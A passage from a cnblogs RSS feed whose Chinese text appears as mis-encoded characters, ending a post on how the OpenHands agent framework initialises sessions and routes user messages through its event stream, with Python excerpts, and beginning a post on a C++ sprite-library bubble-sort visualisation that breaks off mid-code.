<li><strong>æ¨¡åååç¼©å¨è®¾è®¡</strong>ï¼é»è®¤å¯ç¨ä¸é¶æ®µä¸ä¸æåç¼©å¨æµæ°´çº¿ï¼æ âå¯¹è¯çªå£âæµè§å¨è¾åºâLLM æ»ç»â é¡ºåºä¼åä¸ä¸æï¼å¹³è¡¡ä¸ä¸æç¸å³æ§ä¸æ¨¡åè¾å¥é¿åº¦éå¶ã</li>
<li><strong>å®æ´çæå¡éç½®</strong>ï¼èªå¨éç½® MCP æå¡å¨ï¼Agentä¸å·¥å·çéä¿¡æ¢çº½ï¼ï¼æ¯æèªå®ä¹ MCP éç½®æ©å±ï¼ééä¸åé¨ç½²ç¯å¢çå·¥å·éä¿¡éæ±ã</li>
<li><strong>å®å¨ä¸éç§ä¿æ¤</strong>ï¼ææä¿¡æ¯ï¼å¦æ²ç API å¯é¥ï¼éè¿ <code>get_secret_value()</code> å®å¨æåï¼æªç¥éè¯¯ä»è¿åéè¯¯ç±»åï¼é¿åæ³é²ææéç½®ã</li>
<li><strong>ä¸°å¯çæ©å±åæ°</strong>ï¼æ¯æ Git ä»åºè®¿é®ãèªå®ä¹å¯é¥ãä¼è¯æä»¤ç­æ©å±åæ°ï¼ééä»£ç å¼åãç¬¬ä¸æ¹æå¡éæç­å¤æåºæ¯ã</li>
<li><strong>ç²¾ç»åéè¯¯å¤ç</strong>ï¼åºåä¸åç±»åéè¯¯ï¼å¾®Agentéªè¯éè¯¯ãå¼éè¯¯ãæªç¥éè¯¯ï¼ï¼è¿åéå¯¹æ§éè¯¯ä¿¡æ¯ï¼ä¾¿äºé®é¢ææ¥ã</li>
<li><strong>ç¶æå¯è§å</strong>ï¼åå§åå¼å§æ¶åé <code>AgentState.LOADING</code> ç¶æäºä»¶ï¼è®©å®¢æ·ç«¯å®æ¶æç¥Agentå¯å¨è¿åº¦ï¼æåç¨æ·ä½éªã</li>
</ol>
<h5 id="åå§åæµç¨å¾">åå§åæµç¨å¾</h5>
<p><img alt="openhands-4.1-3" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1850883/202602/1850883-20260201082221782-1611897360.png" class="lazyload"></p>
<p>initialize_agent ä»£ç å¦ä¸ï¼</p>
<pre><code class="language-python">    async def initialize_agent(
        self,
        settings: Settings,  # ç¨æ·/ä¼è¯è®¾ç½®ï¼å«Agentç±»åãå®å¨éç½®ç­ï¼
        initial_message: Optional[MessageAction] = None,  # åå§ç¨æ·æ¶æ¯ï¼å¯éï¼
        replay_json: Optional[str] = None,  # ä¼è¯åæ¾JSONï¼å¯éï¼
    ) -&gt; None:
        """
        åå§åAgentæ ¸å¿æµç¨ï¼
        1. æ´æ°ä¼è¯éç½®ï¼èåç¨æ·è®¾ç½®ä¸é»è®¤éç½®ï¼
        2. éç½®MCPæå¡å¨ï¼ç¨äºå·¥å·éä¿¡ï¼
        3. åå§åAgentéç½®ï¼å«ä¸ä¸æåç¼©å¨ï¼
        4. åå»ºAgentå®ä¾å¹¶å¯å¨Agentä¼è¯
        """
        # 1. åéAgentç¶æåæ´äºä»¶ï¼æ è®°ä¸º"å è½½ä¸­"
        self.agent_session.event_stream.add_event(
            AgentStateChangedObservation('', AgentState.LOADING),
            EventSource.ENVIRONMENT,  # äºä»¶æ¥æºï¼ç¯å¢
        )

        # 2. èåç¨æ·è®¾ç½®ä¸é»è®¤éç½®ï¼ç¨æ·è®¾ç½®ä¼åï¼
        # ç¡®å®Agentç±»åï¼ç¨æ·è®¾ç½®ä¼åï¼å¦åç¨é»è®¤ï¼
        agent_cls = settings.agent or self.config.default_agent
        
        # å®å¨éç½®ï¼ç¡®è®¤æ¨¡å¼ï¼ç¨æ·è®¾ç½®ä¼åï¼
        self.config.security.confirmation_mode = (
            self.config.security.confirmation_mode
            if settings.confirmation_mode is None
            else settings.confirmation_mode
        )
        
        # å®å¨éç½®ï¼å®å¨åæå¨ï¼ç¨æ·è®¾ç½®ä¼åï¼
        self.config.security.security_analyzer = (
            self.config.security.security_analyzer
            if settings.security_analyzer is None
            else settings.security_analyzer
        )
        
        # æ²çéç½®ï¼åºç¡å®¹å¨éåï¼ç¨æ·è®¾ç½®ä¼åï¼
        self.config.sandbox.base_container_image = (
            settings.sandbox_base_container_image
            or self.config.sandbox.base_container_image
        )
        
        # æ²çéç½®ï¼è¿è¡æ¶å®¹å¨éåï¼ç¨æ·è®¾ç½®ä¼åï¼é»è¾ï¼åºç¡éåæè¿è¡æ¶éåæä¸ä¸ªè®¾ç½®åç¨ç¨æ·å¼ï¼
        self.config.sandbox.runtime_container_image = (
            settings.sandbox_runtime_container_image
            if settings.sandbox_base_container_image
            or settings.sandbox_runtime_container_image
            else self.config.sandbox.runtime_container_image
        )

        # 3. Gitéç½®ï¼è¥ç¨æ·è®¾ç½®æä¾ï¼è¦çé»è®¤å¼
        git_user_name = getattr(settings, 'git_user_name', None)
        if git_user_name is not None:
            self.config.git_user_name = git_user_name
        git_user_email = getattr(settings, 'git_user_email', None)
        if git_user_email is not None:
            self.config.git_user_email = git_user_email
        
        # 4. ä»»å¡éç½®ï¼æå¤§è¿­ä»£æ¬¡æ°ï¼ç¨æ·è®¾ç½®ä¼åï¼
        max_iterations = settings.max_iterations or self.config.max_iterations
        
        # 5. ä»»å¡éç½®ï¼åä»»å¡æå¤§é¢ç®ï¼ç¨æ·è®¾ç½®ä¼åï¼æ¯æNoneå¼ï¼
        max_budget_per_task = (
            settings.max_budget_per_task
            if settings.max_budget_per_task is not None
            else self.config.max_budget_per_task
        )

        # 6. ç¬¬ä¸æ¹æå¡éç½®ï¼æç´¢APIå¯é¥ãæ²çAPIå¯é¥
        self.config.search_api_key = settings.search_api_key
        if settings.sandbox_api_key:
            # æåæ²çAPIå¯é¥çå®éå¼ï¼get_secret_value()ç¨äºå®å¨å­å¨çå¯é¥ï¼
            self.config.sandbox.api_key = settings.sandbox_api_key.get_secret_value()

        # 7. MCPæå¡å¨éç½®ï¼ç¨äºAgentä¸å·¥å·çéä¿¡ï¼
        
        # è¥ç¨æ·è®¾ç½®æä¾èªå®ä¹MCPéç½®ï¼åå¹¶å°å¨å±éç½®
        mcp_config = getattr(settings, 'mcp_config', None)
        if mcp_config is not None:
            self.config.mcp = self.config.mcp.merge(mcp_config)
        
        # é»è®¤æ·»å OpenHandsçMCPæå¡å¨ï¼HTTP + STDIOç±»åï¼
        openhands_mcp_server, openhands_mcp_stdio_servers = (
            OpenHandsMCPConfigImpl.create_default_mcp_server_config(
                self.config.mcp_host, self.config, self.user_id
            )
        )
        if openhands_mcp_server:
            self.config.mcp.shttp_servers.append(openhands_mcp_server)
            self.config.mcp.stdio_servers.extend(openhands_mcp_stdio_servers)

        # 8. Agentéç½®åå§å
        # è·åæå®Agentç±»åçéç½®
        agent_config = self.config.get_agent_config(agent_cls)
        # ä¼ éè¿è¡æ¶ä¿¡æ¯å°Agentéç½®ï¼ç¨äºå·¥å·çè¿è¡æ¶ç¹å®è¡ä¸ºï¼
        agent_config.runtime = self.config.runtime
        # è·åAgentå¯¹åºçLLMéç½®
        agent_name = agent_cls if agent_cls is not None else 'agent'
        llm_config = self.config.get_llm_config_from_agent(agent_name)
        
        # è¥å¯ç¨é»è®¤ä¸ä¸æåç¼©å¨ï¼éç½®åç¼©å¨æµæ°´çº¿
        if settings.enable_default_condenser:
            """
            é»è®¤åç¼©å¨æµæ°´çº¿åå«ä¸ä¸ªé¶æ®µï¼é¡ºåºéè¦ï¼ï¼
            1. å¯¹è¯çªå£åç¼©å¨ï¼å¤çæ¾å¼çåç¼©è¯·æ±
            2. æµè§å¨è¾åºåç¼©å¨ï¼éå¶æµè§å¨è§å¯ç»æçå¤§å°ï¼æ³¨æåçªå£=2ï¼
            3. LLMæ»ç»åç¼©å¨ï¼éå¶ä¼ éç»LLMçä¸ä¸æå¤§å°
            é¡ºåºè®¾è®¡åå ï¼åå¤çæµè§å¨è¾åºï¼å¯åå°æ»ç»ææ¬ï¼ä»ä¿çææ°æµè§å¨è¾åºï¼
            """
            max_events_for_condenser = settings.condenser_max_size or 120  # åç¼©å¨æå¤§äºä»¶æ°ï¼é»è®¤120ï¼
            default_condenser_config = CondenserPipelineConfig(
                condensers=[
                    ConversationWindowCondenserConfig(),
                    BrowserOutputCondenserConfig(attention_window=2),
                    LLMSummarizingCondenserConfig(
                        llm_config=llm_config,
                        keep_first=4,  # ä¿çå4ä¸ªäºä»¶ï¼ä¸åç¼©ï¼
                        max_size=max_events_for_condenser,  # åç¼©åæå¤§äºä»¶æ°
                    ),
                ]
            )

            agent_config.condenser = default_condenser_config
        
        # 9. åå»ºAgentå®ä¾ï¼éè¿Agentå·¥åæ¹æ³è·åå¯¹åºç±»åçAgentç±»ï¼
        agent = Agent.get_cls(agent_cls)(agent_config, self.llm_registry)

        # 10. ç»å®LLMéè¯çå¬å¨ï¼Agentä¼è¯ä¸­LLMéè¯æ¶è§¦åéç¥ï¼
        self.llm_registry.retry_listener = self._notify_on_llm_retry

        # 11. æåConversationInitDataç±»åè®¾ç½®ä¸­çæ©å±åæ°ï¼è¥éç¨ï¼
        git_provider_tokens = None  # Gitæä¾åä»¤çï¼ç¨äºä»£ç ä»åºè®¿é®ï¼
        selected_repository = None  # éä¸­çä»£ç ä»åº
        selected_branch = None  # éä¸­çä»åºåæ¯
        custom_secrets = None  # èªå®ä¹å¯é¥ï¼ç¨äºç¬¬ä¸æ¹æå¡è®¿é®ï¼
        conversation_instructions = None  # ä¼è¯æä»¤ï¼èªå®ä¹Agentè¡ä¸ºï¼
        if isinstance(settings, ConversationInitData):
            git_provider_tokens = settings.git_provider_tokens
            selected_repository = settings.selected_repository
            selected_branch = settings.selected_branch
            custom_secrets = settings.custom_secrets
            conversation_instructions = settings.conversation_instructions

        # 12. å¯å¨Agentä¼è¯ï¼æ ¸å¿æ­¥éª¤ï¼
        try:
            await self.agent_session.start(
                runtime_name=self.config.runtime,  # è¿è¡æ¶åç§°ï¼å¦æ²çç±»åï¼
                config=self.config,  # å®æ´éç½®
                agent=agent,  # Agentå®ä¾
                max_iterations=max_iterations,  # æå¤§è¿­ä»£æ¬¡æ°
                max_budget_per_task=max_budget_per_task,  # åä»»å¡æå¤§é¢ç®
                agent_to_llm_config=self.config.get_agent_to_llm_config_map(),  # Agent-LLMéç½®æ å°
                agent_configs=self.config.get_agent_configs(),  # ææAgentéç½®
                git_provider_tokens=git_provider_tokens,  # Gitä»¤ç
                custom_secrets=custom_secrets,  # èªå®ä¹å¯é¥
                selected_repository=selected_repository,  # éä¸­ä»åº
                selected_branch=selected_branch,  # éä¸­åæ¯
                initial_message=initial_message,  # åå§ç¨æ·æ¶æ¯
                conversation_instructions=conversation_instructions,  # ä¼è¯æä»¤
                replay_json=replay_json,  # ä¼è¯åæ¾æ°æ®
            )
        except MicroagentValidationError as e:
            # å¾®Agentéªè¯éè¯¯ï¼è¾åºè¯¦ç»éè¯¯ä¿¡æ¯ï¼å¸®å©ç¨æ·ææ¥éç½®é®é¢ï¼
            return
        except ValueError as e:
            # å¼éè¯¯ï¼åºåå¾®Agentç¸å³éè¯¯åæ®éå¼éè¯¯
            self.logger.exception(f"åå»ºAgentä¼è¯å¤±è´¥: {e}")
            error_message = str(e)
            return
        except Exception as e:
            # å¶ä»æªç¥éè¯¯ï¼ä»è¾åºéè¯¯ç±»åï¼é¿åæ³é²ææä¿¡æ¯ï¼

            return

</code></pre>
<h3 id="24-ç¨æ·äº¤äºoh_user_actioné»è¾">2.4 ç¨æ·äº¤äº(oh_user_action)é»è¾</h3>
<h4 id="241-ç¨æ·åæ¶æ¯">2.4.1 ç¨æ·åæ¶æ¯</h4>
<p>å½ç¨æ·åæ¶æ¯ï¼å°±æ¯éè¿<code>socket</code>å¨ oh_user_action å½æ°éè¿<code>conversation_manager</code>åäºä»¶ä¸­å¿ä¸­æ·»å ä¸æ¡äºä»¶ãä»£ç ä½äº openhands\server\listen_socket.pyã</p>
<pre><code class="language-python">@sio.event
async def oh_user_action(connection_id: str, data: dict[str, Any]) -&gt; None:
    await conversation_manager.send_to_event_stream(connection_id, data)


</code></pre>
<p>æ§API ä¼è°ç¨å°è¿éã</p>
<pre><code class="language-python">@sio.event
async def oh_action(connection_id: str, data: dict[str, Any]) -&gt; None:
    # TODO: Remove this handler once all clients are updated to use oh_user_action
    # Keeping for backward compatibility with in-progress sessions
    await conversation_manager.send_to_event_stream(connection_id, data)


</code></pre>
<h4 id="242-äºä»¶æ·»å ">2.4.2 äºä»¶æ·»å </h4>
<p>send_to_event_stream ä½äº openhands\server\conversation_manager\standalone_conversation_manager.pyãæç»è°ç¨å° session.dispatch åäºä»¶æµåéäºä»¶ã</p>
<pre><code class="language-python">    async def send_to_event_stream(self, connection_id: str, data: dict):
        # If there is a local session running, send to that
        sid = self._local_connection_id_to_session_id.get(connection_id)
        if not sid:
            raise RuntimeError(f'no_connected_session:{connection_id}')
        await self.send_event_to_conversation(sid, data)

    async def send_event_to_conversation(self, sid: str, data: dict):
        session = self._local_agent_loops_by_sid.get(sid)
        if not session:
            raise RuntimeError(f'no_conversation:{sid}')
        await session.dispatch(data)

</code></pre>
<p>dispatch ä»£ç å¦ä¸ã</p>
<pre><code class="language-python">async def dispatch(self, data: dict) -&gt; None:
    # ...
    self.agent_session.event_stream.add_event(event, EventSource.USER)

</code></pre>
<h4 id="243-äºä»¶å¤ç">2.4.3 äºä»¶å¤ç</h4>
<p>å½ä¸æ¡äºä»¶è¢«å å¥ç³»ç»çäºä»¶æµåï¼ç©¶ç«ä¼è§¦ååªäºæ¨¡åçååºï¼è¦è§£ç­è¿ä¸ªé®é¢ï¼æä»¬é¦åéè¦æ¢³çç³»ç»ä¸­å·²è®¢éäºä»¶æµçæ ¸å¿æ¨¡å ââ å®ä»¬å°±åæ¶å»å¾å½çæ¥æ¶èï¼åèªå®å¨ä¸å±çæ¶æ¯ééæï¼Session æ¨¡åè®¢éäº SERVER ééï¼Runtime æ¨¡åå¯¹åº RUNTIME ééï¼Memory æ¨¡åçå¬ç MEMORY ééï¼è AgentController æ¨¡ååèç¦äº AGENT_CONTROLLER ééã</p>
<p>å½ç¨æ·åéä¸æ¡æ¶æ¯å¹¶è¿å¥äºä»¶æµåï¼è¿æ¡æ¶æ¯ä¼ä»¥å¹¿æ­çå½¢å¼æ©æ£å°ææè®¢éééï¼åä¸ªæ¨¡åä¼éè¿é¢åæ³¨åçåè°å½æ°å¯å¨ç¸åºå¤çæµç¨ï¼å·ä½æµç¨å¦ä¸ï¼</p>
<p>AgentController æ¨¡åä¼å¨ _on_event å½æ°éé¢å¤çã</p>
<pre><code class="language-python">    async def _on_event(self, event: Event) -&gt; None:
        if hasattr(event, 'hidden') and event.hidden:
            return

        self.state_tracker.add_history(event)

        if isinstance(event, Action):
            await self._handle_action(event)
        elif isinstance(event, Observation):
            await self._handle_observation(event)

        should_step = self.should_step(event)
        if should_step:
            self.log(
                'debug',
                f'Stepping agent after event: {type(event).__name__}',
                extra={'msg_type': 'STEPPING_AGENT'},
            )
            await self._step_with_exception_handling()
        elif isinstance(event, MessageAction) and event.source == EventSource.USER:
            # If we received a user message but aren't stepping, log why
            self.log(
                'warning',
                f'Not stepping agent after user message. Current state: {self.get_agent_state()}',
                extra={'msg_type': 'NOT_STEPPING_AFTER_USER_MESSAGE'},
            )

</code></pre>
<p>_handle_action ä¼è°ç¨  _handle_message_actionã</p>
<pre><code class="language-python">    async def _handle_action(self, action: Action) -&gt; None:
        """Handles an Action from the agent or delegate."""
        if isinstance(action, ChangeAgentStateAction):
            await self.set_agent_state_to(action.agent_state)  # type: ignore
        elif isinstance(action, MessageAction):
            await self._handle_message_action(action)
        elif isinstance(action, AgentDelegateAction):
            await self.start_delegate(action)
            assert self.delegate is not None
            # Post a MessageAction with the task for the delegate
            if 'task' in action.inputs:
                self.event_stream.add_event(
                    MessageAction(content='TASK: ' + action.inputs['task']),
                    EventSource.USER,
                )
                await self.delegate.set_agent_state_to(AgentState.RUNNING)
            return

        elif isinstance(action, AgentFinishAction):
            self.state.outputs = action.outputs
            await self.set_agent_state_to(AgentState.FINISHED)
        elif isinstance(action, AgentRejectAction):
            self.state.outputs = action.outputs
            await self.set_agent_state_to(AgentState.REJECTED)

</code></pre>
<p>_handle_message_action ä¸­ï¼AgentController æ¨¡åä¼çæä¸æ¡ RecallAction äºä»¶å¹¶åæ¬¡æ¨å¥äºä»¶æµï¼è¯¥äºä»¶çç±»åä¼æ ¹æ®å½åæ¯å¦ä¸ºç¨æ·é¦æ¬¡è¾å¥æ¥å¤å®ï¼è¥æ¯é¦æ¬¡è¾å¥åè®¾ä¸º RecallType.WORKSPACE_CONTEXTï¼åä¹åè®¾ä¸º RecallType.KNOWLEDGEï¼</p>
<pre><code class="language-python">    async def _handle_message_action(self, action: MessageAction) -&gt; None:
        """Handles message actions from the event stream.

        Args:
            action (MessageAction): The message action to handle.
        """
        if action.source == EventSource.USER:
            # Use info level if LOG_ALL_EVENTS is set
            log_level = (
                'info' if os.getenv('LOG_ALL_EVENTS') in ('true', '1') else 'debug'
            )
            self.log(
                log_level,
                str(action),
                extra={'msg_type': 'ACTION', 'event_source': EventSource.USER},
            )

            # if this is the first user message for this agent, matters for the microagent info type
            first_user_message = self._first_user_message()
            is_first_user_message = (
                action.id == first_user_message.id if first_user_message else False
            )
            recall_type = (
                RecallType.WORKSPACE_CONTEXT
                if is_first_user_message
                else RecallType.KNOWLEDGE
            )

            recall_action = RecallAction(query=action.content, recall_type=recall_type)
            self._pending_action = recall_action
            # this is source=USER because the user message is the trigger for the microagent retrieval
            self.event_stream.add_event(recall_action, EventSource.USER)

            if self.get_agent_state() != AgentState.RUNNING:
                await self.set_agent_state_to(AgentState.RUNNING)

        elif action.source == EventSource.AGENT:
            # If the agent is waiting for a response, set the appropriate state
            if action.wait_for_response:
                await self.set_agent_state_to(AgentState.AWAITING_USER_INPUT)

</code></pre>
<p>AgentController æ¨¡åä¼å¨ _on_event å½æ°éé¢è°ç¨ agent.step æ¹æ³ï¼å¯å¨æºè½ä½çæ ¸å¿å¤çæµç¨ã</p>
<p>è¿éç agent.step çå·ä½é»è¾åå³äºéç½®æä»¶ä¸­æå®çæºè½ä½ç±»åãä»¥å¸¸è§ç CodeActAgent ä¸ºä¾ï¼è¯¥æ¹æ³ä¼æå OpenHands/openhands/agenthub/codeact_agent/codeact_agent.py ä¸­ç step å½æ°ãæç»å°æ´çåçä¿¡æ¯è½¬åä¸ºç¬¦åå¤§è¯­è¨æ¨¡åè¾å¥æ ¼å¼ç messagesã</p>
<pre><code class="language-python">    def step(self, state: State) -&gt; 'Action':
        """Performs one step using the CodeAct Agent.

        This includes gathering info on previous steps and prompting the model to make a command to execute.

        Parameters:
        - state (State): used to get updated info

        Returns:
        - CmdRunAction(command) - bash command to run
        - IPythonRunCellAction(code) - IPython code to run
        - AgentDelegateAction(agent, inputs) - delegate action for (sub)task
        - MessageAction(content) - Message action to run (e.g. ask for clarification)
        - AgentFinishAction() - end the interaction
        - CondensationAction(...) - condense conversation history by forgetting specified events and optionally providing a summary
        - FileReadAction(path, ...) - read file content from specified path
        - FileEditAction(path, ...) - edit file using LLM-based (deprecated) or ACI-based editing
        - AgentThinkAction(thought) - log agent's thought/reasoning process
        - CondensationRequestAction() - request condensation of conversation history
        - BrowseInteractiveAction(browser_actions) - interact with browser using specified actions
        - MCPAction(name, arguments) - interact with MCP server tools
        """
        # Continue with pending actions if any
        if self.pending_actions:
            return self.pending_actions.popleft()

        # if we're done, go back
        latest_user_message = state.get_last_user_message()
        if latest_user_message and latest_user_message.content.strip() == '/exit':
            return AgentFinishAction()

        # Condense the events from the state. If we get a view we'll pass those
        # to the conversation manager for processing, but if we get a condensation
        # event we'll just return that instead of an action. The controller will
        # immediately ask the agent to step again with the new view.
        condensed_history: list[Event] = []
        match self.condenser.condensed_history(state):
            case View(events=events):
                condensed_history = events

            case Condensation(action=condensation_action):
                return condensation_action

        initial_user_message = self._get_initial_user_message(state.history)
        messages = self._get_messages(condensed_history, initial_user_message)
        params: dict = {
            'messages': messages,
        }
        params['tools'] = check_tools(self.tools, self.llm.config)
        params['extra_body'] = {
            'metadata': state.to_llm_metadata(
                model_name=self.llm.config.model, agent_name=self.name
            )
        }
        response = self.llm.completion(**params)
        logger.debug(f'Response from LLM: {response}')
        actions = self.response_to_actions(response)
        logger.debug(f'Actions after response_to_actions: {actions}')
        for action in actions:
            self.pending_actions.append(action)
        return self.pending_actions.popleft()


</code></pre>
<p>å½å¤§è¯­è¨æ¨¡åå¤çå®æå¹¶è¿åç»æåï¼è¯¥ç»æä¼è¢«å°è£æ Action å¯¹è±¡éæ°éå¥äºä»¶æµãåè®¾æ¨¡åç´æ¥è¿åäº MessageAction ç±»åçç»æï¼Session æ¨¡åä¾¿ä¼æè·è¿æ¡äºä»¶ï¼å¹¶å°å¶ä¸­çåå®¹è½¬åè³åç«¯çé¢ï¼å®æåç¨æ·çåé¦å±ç¤ºã</p>
<h2 id="0xff-åè">0xFF åè</h2>
<p><a href="https://docs.all-hands.dev/openhands/usage/architecture/backend" target="_blank" rel="noopener nofollow">https://docs.all-hands.dev/openhands/usage/architecture/backend</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/1936485868761257658" target="_blank" rel="noopener nofollow">å½AI Agentä»âç©å·âèµ°åâå·¥å·âï¼æä»¬è¯¥å³æ³¨ä»ä¹ï¼Openhandsæ¶æè§£æãç¬¬äºç¯ï¼Agent ç¸å³æ ¸å¿æ¦å¿µã</a>  <a href="https://www.zhihu.com/people/dreamrenderx" target="_blank" rel="noopener nofollow">åé</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/1936175201323825087" target="_blank" rel="noopener nofollow">å½AI Agentä»âç©å·âèµ°åâå·¥å·âï¼æä»¬è¯¥å³æ³¨ä»ä¹ï¼Openhandsæ¶æè§£æãç¬¬ä¸ç¯ï¼ç³»åå¯¼è¯»ã</a> <a href="https://www.zhihu.com/people/dreamrenderx" target="_blank" rel="noopener nofollow">åé</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/1940436682949244630" target="_blank" rel="noopener nofollow">Coding Agentä¹Openhandsè§£æ(å«ä»£ç )</a>  <a href="https://www.zhihu.com/people/wu-long-ming-cha-56" target="_blank" rel="noopener nofollow">Arrow</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/1940824548485347192" target="_blank" rel="noopener nofollow">OpenHands æºç è§£è¯»</a>  <a href="https://www.zhihu.com/people/xiao-hui-66-72" target="_blank" rel="noopener nofollow">ä¸åè¾</a></p>
<p><a href="https://adk.wiki/" target="_blank" rel="noopener nofollow">https://adk.wiki/</a></p>


</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-02-02 20:55">2026-02-02 20:54</span>&nbsp;
<a href="https://www.cnblogs.com/rossiXYZ">ç½è¥¿çæè</a>&nbsp;
éè¯»(<span id="post_view_count">0</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19560009);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19560009', targetLink: 'https://www.cnblogs.com/rossiXYZ/p/19560009', title: 'AI Agent æ¡æ¶æ¢ç§ï¼æè§£ OpenHandsï¼5ï¼--- äº¤äº&amp;amp;ä¼è¯' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ ä¸ä¸ªææçç¼ç¨æå®¤ï¼çµèå±å¹ååçä¸ä½ç¨åºåï¼ä½ ï¼ï¼æè¾¹ç«çä¸ä½å¥½å¥çæåã ]]></title>
    <link>https://www.cnblogs.com/lixingqiu/p/19566285</link>
    <guid>9c7cf314fcd428f950ff05c27a8e2c93</guid>
    <description>
    <![CDATA[ 
	<h1 class="postTitle"><a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/lixingqiu/p/19566285" title="åå¸äº 2026-02-02 20:13">
    <span role="heading" aria-level="2">ä¸ä¸ªææçç¼ç¨æå®¤ï¼çµèå±å¹ååçä¸ä½ç¨åºåï¼ä½ ï¼ï¼æè¾¹ç«çä¸ä½å¥½å¥çæåã</span>
    

</a>
</h1>
	<div id="cnblogs_post_body" class="blogpost-body blogpost-body-html">
<p><img alt="æ æ é¢" width="297" height="287" loading="lazy" data-src="https://img2024.cnblogs.com/blog/523461/202602/523461-20260202201328054-675354003.png" class="lazyload"></p>
<p>&nbsp;</p>
<p>å¯ä»¥åçè§é¢ï¼https://www.douyin.com/video/7602172380894563636</p>
<p>æåï¼âå¿ï¼ä¼è®¡ï¼ä½ å¨å¹²å¥å¢ï¼è¿å±å¹ä¸ä¸å å°çå¨å¨æ¥å¨å»çï¼æ¯å¥ç©æå¿ï¼â</p>
<p>ä½ ï¼æ¨äºæ¨ç¼éï¼ï¼âå¦ï¼è¿æ¯åæ³¡æåºçå¯è§åç¨åºãä½ ç¥éåæ³¡æåºåï¼â</p>
<p>æåï¼âå¬è¯´è¿ï¼ä½å·ä½ååäºæä¸å¤ªæ¸æ¥ãâ</p>
<p>ä½ ï¼âé£æå°±ç»ä½ è®²è®²ãå°±åè¿äºå°çä¸æ ·ï¼å®ä»¬ä¸å¼å§æ¯ä¹±åºçï¼æä»¬è¦æå®ä»¬ä»å°å°å¤§æå¥½ãâ</p>
<p>æåï¼âé£æä¹æå¢ï¼â</p>
<p>ä½ ï¼âå¾ç®åï¼å°±æ¯ä¸¤ä¸¤æ¯è¾ï¼å¦æåé¢çæ¯åé¢çå¤§ï¼å°±äº¤æ¢ä½ç½®ãå°±åè¿æ ·âââ</p>
<p>ï¼ä½ æçå±å¹ï¼</p>
<p>âä½ çï¼ç¬¬ä¸ä¸ªçº¢çåæ©çæ¯ï¼åç°çº¢çå¤§ï¼äºæ¯å®ä»¬äº¤æ¢ä½ç½®ï¼æ¥çæ©çåé»çæ¯â¦â¦â</p>
<p>æåï¼âå¦ï¼æç¹åæçæ¶çççæè§ãâ</p>
<p>ä½ ï¼âå¯¹å¯¹å¯¹ï¼å°±æ¯è¿ä¹ä¸ªææãæ¯ä¸è½®ä¸æ¥ï¼æå¤§çé£ä¸ªæ°å°±ä¼âæ²âå°æåé¢ï¼å°±åæ°æ³¡å¾ä¸åä¸æ ·ï¼æä»¥å«âåæ³¡æåºâãâ</p>
<p>æåï¼âé£è¿äºå°çä¸ºå¥ä¼å¨åï¼â</p>
<p>ä½ ï¼âå ä¸ºæä»¬ç¨äºC++ç²¾çµåºï¼æ¯ä¸ªå°çé½æ¯ä¸ä¸ªâSpriteâå¯¹è±¡ï¼æé¢è²ãå¤§å°ãä½ç½®ç­å±æ§ãæ¯æ¬¡äº¤æ¢çæ¶åï¼æä»¬ä¸ä»æ¢æ°æ®ï¼è¿è®©å®ä»¬çå¾åä¹è·çç§»å¨ãâ</p>
<p>æåï¼âåï¼è¿æºç´è§çãâ</p>
<p>ä½ ï¼âæ¯åï¼èä¸ä½ çä¸é¢è¿ææå­æç¤ºï¼è¯´ç°å¨æ¯ç¬¬å è½®ï¼æåè¿ä¼æ¾ç¤ºâæ¼ç¤ºå®æ¯ï¼ââ</p>
<p>æåï¼âé£è°åçè¿ä¸ªç¨åºåï¼â</p>
<p>ä½ ï¼å¾æå°ç¬ï¼ï¼âæå¸ç¥ââæå´çèå¸ãä»åäºè¿ä¸ªC++ç²¾çµåºï¼æ¹ä¾¿æä»¬åè¿ç§å¨ç»ææãâ</p>
<p>æåï¼âåå®³åï¼é£æè½ä¸è½ä¹è¯è¯ï¼â</p>
<p>ä½ ï¼âå½ç¶å¯ä»¥ï¼ä»£ç é½å¨è¿å¿å¢ï¼ä½ æ³æ¹å¤å°é½è¡ãâ</p>
<hr>
<div class="cnblogs_code">
<pre>#include <span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">sprites.h</span><span style="color: rgba(128, 0, 0, 1)">"</span>  <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">åå«C++ç²¾çµåº </span>
<span style="color: rgba(0, 0, 255, 1)">using</span> <span style="color: rgba(0, 0, 255, 1)">namespace</span><span style="color: rgba(0, 0, 0, 1)"> std;
Sprite rocket;      </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">å»ºç«è§è²å«rocket</span>
<span style="color: rgba(0, 0, 255, 1)">struct</span><span style="color: rgba(0, 0, 0, 1)"> Node{
   </span><span style="color: rgba(0, 0, 255, 1)">int</span> value,x;  <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">å¼ååæ </span>
   Sprite *<span style="color: rgba(0, 0, 0, 1)">sp;
};
vector</span>&lt;Node *&gt;<span style="color: rgba(0, 0, 0, 1)"> datas;
vector</span>&lt;<span style="color: rgba(0, 0, 255, 1)">string</span>&gt; colors = {<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">red</span><span style="color: rgba(128, 0, 0, 1)">"</span>,<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">orange</span><span style="color: rgba(128, 0, 0, 1)">"</span>,<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">yellow</span><span style="color: rgba(128, 0, 0, 1)">"</span>,<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">green</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">,
